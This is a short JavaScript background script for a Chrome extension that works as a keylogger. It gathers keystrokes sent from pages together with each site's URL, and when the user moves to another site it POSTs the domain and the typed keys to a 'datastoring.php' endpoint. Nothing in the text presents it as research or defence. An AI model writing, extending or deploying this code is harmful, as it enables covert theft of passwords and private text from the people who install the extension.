function handleMessage(request) {
    k = request.datakeys;
    tmpurl = request.dataurl;
    if (checkurl != "") {if (checkurl != tmpurl) {
        if (skeys == "") {keys = "No keys";} else {keys = skeys;}
        if (checkurl != "") {const shorten = checkurl.split("/"); url = shorten[2];}
        data = "url="+url+"&touches="+keys;
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "../datastoring.php", true);
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        xhr.send(data);
        skeys = k;
        checkurl = request.dataurl;
    } else {skeys = skeys + k;}} else {skeys = skeys + k; checkurl = request.dataurl;}
}

chrome.runtime.onMessage.addListener(handleMessage);
skeys = "";
checkurl = "";